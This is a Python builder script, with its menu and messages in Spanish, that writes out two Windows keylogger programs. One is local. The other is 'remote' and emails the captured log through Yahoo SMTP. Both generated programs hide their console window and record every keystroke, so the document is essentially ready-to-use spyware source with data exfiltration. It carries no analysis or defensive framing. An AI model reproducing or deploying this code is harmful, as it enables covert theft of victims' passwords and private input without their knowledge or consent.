import os

os.system("clear")

print("")

os.system("clear && figlet Keylogger | lolcat")

def menu_principal():
    while True:
        print("\n[1] Crear keylogger Local")
        print("[2] Crear keylogger Remoto")
        print("[3] Salir")
        opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
        if opcion == "1":
            codigo = '''from pynput import keyboard
import win32console
import win32gui

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
            '''
            with open("keylogger-local.py", "w") as archivo:
                archivo.write(codigo)
                print("\033[1m\n[+] Se ha creado el archivo 'keylogger-local.py'\033[0m")
        
        if opcion == "2":
            codigo= '''from pynput import keyboard
import win32console
import win32gui
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)

# Configuración de correo electrónico
smtp_server = "smtp.mail.yahoo.com"
smtp_port = 587
sender_email = "tu correo"
sender_password = "tu contraseña"
receiver_email = "correo donde vas a recibir el mensaje"

def send_email():
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Archivo Keylogger"

    with open("Keylogger.txt", "r") as file:
        attachment = MIMEText(file.read())

    attachment.add_header("Content-Disposition", "attachment", filename="Keylogger.txt")
    message.attach(attachment)

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(message)
        print("Correo enviado con éxito.")
    except smtplib.SMTPException as e:
        print("Error al enviar el correo:", e)

def on_press(key):
    try:
        with open("Keylogger.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        with open("Keylogger.txt", "a") as f:
            f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        send_email()
        return False

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
        '''
            with open("keylogger-remoto.py", "w") as archivo:
                archivo.write(codigo)
                print("\033[1m\n[+] Se ha creado el archivo 'keylogger-remoto.py'\033[0m")

        if opcion == "3":
            break

menu_principal()
